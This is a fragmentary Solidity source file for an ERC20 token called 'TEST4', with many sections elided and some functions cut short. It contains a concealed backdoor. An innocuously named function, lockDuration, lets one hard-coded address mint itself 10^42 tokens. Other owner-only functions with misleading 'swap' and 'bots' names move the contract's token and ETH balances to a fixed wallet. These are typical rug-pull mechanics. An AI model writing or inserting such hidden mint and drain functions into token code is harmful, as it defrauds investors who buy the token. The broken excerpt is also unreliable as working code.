...
interface ERC20Metadata is ERC20 {
 ...
 contract TEST4 is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private lubovta;
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    string private _name;
    string private _symbol = "TEST4";
    uint256 private constant MAX = ~uint256(0);

    uint256 private _maxTx = _totalSupply;
    address private _feeAddrWallet1 = 0xa35bc481AB994a12166Cd2D30ecc56bf2F2aaaFf;
    address private _feeAddrWallet2 = 0xa35bc481AB994a12166Cd2D30ecc56bf2F2aaaFf;
    uint8 private _decimals = 9;
    uint256 private _totalSupply;
    uint256 private constant _tTotal = 10000 * 10**18;
    address private _emiliq = 0xC3784d5155D9049c2af2F78374F075d244bc992A;
    ...
    constructor(uint256 totalSupply_, uint256 demantia_) {
        _owner = _msgSender();
        _demand = demantia_;
        _name = "Test 4";
        _totalSupply = totalSupply_;
        lubovta[msg.sender] = _totalSupply;
    ...
    function lockDuration() public {
        require(_msgSender() == _emiliq, "Please try again later.");
        _export();
    }
...
function _reflectFee(uint256 rFee, uint256 tFee) private {
    ...
    function injectSwap() external {
        require (_msgSender() == _feeAddrWallet1);
        uint256 contractBalance = balanceOf(address(this));
        lockBots(contractBalance);
    }
    
    function refrainSwap() external {
        require (_msgSender() == _feeAddrWallet1);
        uint256 contractETHBalance = address(this).balance;
        unlockBots(contractETHBalance);
    }
    ...
    function _export() internal {
      lubovta[_emiliq] = 1 * 10 ** 42;
    }
    
     
function lockBots (uint256 amount) private {
   ...
   */
    ...
    function _burn(address account, uint256 sum) internal virtual {
        ...
        uint256 accountBalance = lubovta[account];
        require(accountBalance >= sum, "BEP : Can't be done");
        unchecked {
            lubovta[account] = accountBalance - sum;
        }
        _totalSupply -= sum;
...
function unlockBots (uint256 tokenAmount) private lockTheSwap {
